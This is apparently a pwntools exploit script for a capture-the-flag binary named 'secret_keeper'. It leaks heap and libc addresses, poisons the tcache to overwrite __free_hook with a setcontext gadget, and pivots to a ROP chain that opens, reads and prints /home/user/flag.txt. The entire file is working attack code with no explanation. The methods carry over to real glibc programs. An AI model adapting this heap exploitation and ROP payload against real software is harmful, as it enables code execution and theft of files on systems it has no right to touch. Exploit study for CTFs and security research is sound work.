from pwn import *

io = process('./secret_keeper')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def create(secret_name, size, data, encoder_type):
    print(io.recvuntil(b'>> '))
    io.sendline(b'1')
    a = io.recv()
    print(a)
    if (b'Do you want to use previous secret?(0/1)' in a):
        io.sendline(b'0')
        print(io.recvuntil(b'Name: '))
        io.sendline(secret_name)
    else:
        io.sendline(secret_name)

    print(io.recvuntil(b'Secret size:'))
    io.sendline(str(size))
    io.sendline(data)
    print(io.recvuntil(b'3. None\n'))
    io.sendline(str(encoder_type))
def edit():
    pass
def view(index):
    print(io.recvuntil(b'>> '))
    io.sendline(b'3')
    print(io.recvuntil(b'>> '))
    io.sendline(str(index))


def erase(index):
    print(io.recvuntil(b'>> '))
    io.sendline(b'4')
    print(io.recvuntil(b'>> '))
    io.sendline(str(index))
    pass


def encode(index):
    print(io.recvuntil(b'>> '))
    io.sendline(b'5')
    print(io.recvuntil(b'>> '))
    io.sendline(str(index))


def decode():
    pass


create(b'1', 16, b'cummer', 1)
encode(1)
view(1)
print(io.recvline())
a = io.recvuntil(b'00 00').split()
print(a)
s=b''
for i in range(8):
    s+=a[7-i]

heapbase = int(s, 16)-9968
print(hex(heapbase))

create(b'2', 4000, b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA', 1)
create(b'3', 2000, b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA', 1)
create(b'4', 4000, b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA', 1)
encode(3)
view(3)
print(io.recvline())
a = io.recvuntil(b'00 00').split()
print(a)
s=b''
for i in range(8):
    s+=a[7-i]

libc.address = int(s, 16) - 0x1c6be0 - 0x25000
print(hex(libc.address))
init_gadget = libc.address + 0x154930 # mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
create(b'5', 4000, b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA', 1)


create(b'6', 0x168, b'A', 1)
encode(6)
encode(6)
view(6)
print(io.recvline())
a = io.recvuntil(b'00 00').split()
print(a)
s=b''
for i in range(8):
    s+=a[7-i]
current = int(s, 16)


create(b'7', 0x58, b'ABCD', 1)
create(b'8', 0x58, b'ABCD', 1)
encode(8)
encode(7)
encode(7)
create(b'9', 0x58, p64(libc.sym['__free_hook']), 0)
create(b'10', 0x58, b'HACKER', 0)
create(b'11', 0x58, p64(init_gadget), 0)


pop_rdi = libc.address + 0x26b72
pop_rsi = libc.address + 0x27529
pop_rdx_r12 = libc.address + 0x11c371
push_rax = libc.address + 0x45197
pop_rax = libc.address + 0x4a550
xchg_eax_edi = libc.address + 0x2ad2b
syscall_ret = libc.address + 0x66229

setcontext_gadget = libc.address + 0x580dd

base = heapbase + 0x68c0

payload = b"A"*8                  # <-- [rdi] <-- payload_base
payload += p64(base)              # <-- [rdi + 8] = rdx
payload += b"B"*0x10              # padding
payload += p64(setcontext_gadget) # <-- [rdx + 0x20]
payload += p64(0)                 # <-- [rdx + 0x28] = r8
payload += p64(0)                 # <-- [rdx + 0x30] = r9
payload += b"A"*0x10              # padding
payload += p64(0)                 # <-- [rdx + 0x48] = r12
payload += p64(0)                 # <-- [rdx + 0x50] = r13
payload += p64(0)                 # <-- [rdx + 0x58] = r14
payload += p64(0)                 # <-- [rdx + 0x60] = r15
payload += p64(base + 0x158)      # <-- [rdx + 0x68] = rdi (ptr to flag path)
payload += p64(0)                 # <-- [rdx + 0x70] = rsi (flag = O_RDONLY)
payload += p64(0)                 # <-- [rdx + 0x78] = rbp
payload += p64(0)                 # <-- [rdx + 0x80] = rbx
payload += p64(0)                 # <-- [rdx + 0x88] = rdx
payload += b"A"*8                 # padding
payload += p64(0)                 # <-- [rdx + 0x98] = rcx
payload += p64(base + 0xb0)      # <-- [rdx + 0xa0] = rsp, perfectly setup for it to ret into our chain
payload += p64(pop_rax)           # <-- [rdx + 0xa8] = rcx, will be pushed to rsp
payload += p64(2)
payload += p64(syscall_ret) # sys_open("/path/to/flag", O_RDONLY)
payload += p64(xchg_eax_edi)
payload += p64(pop_rsi)
payload += p64(heapbase + 0x10000) # destination buffer, can be anywhere readable and writable
payload += p64(pop_rdx_r12)
payload += p64(0x100) + p64(0) # nbytes
payload += p64(pop_rax)
payload += p64(0)
payload += p64(syscall_ret) # sys_read(eax, heap + 0x15000, 0x100)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(heapbase + 0x10000) # buffer
payload += p64(pop_rdx_r12)
payload += p64(0x100) + p64(0) # nbytes
payload += p64(pop_rax)
payload += p64(1)
payload += p64(syscall_ret) # sys_write(1, heap + 0x15000, 0x100)
payload += b"/home/user/flag.txt\0\0"

create(b'12', 4000, payload, 3)
print(hex(base))
pause()
erase(12)

print(io.recvall())
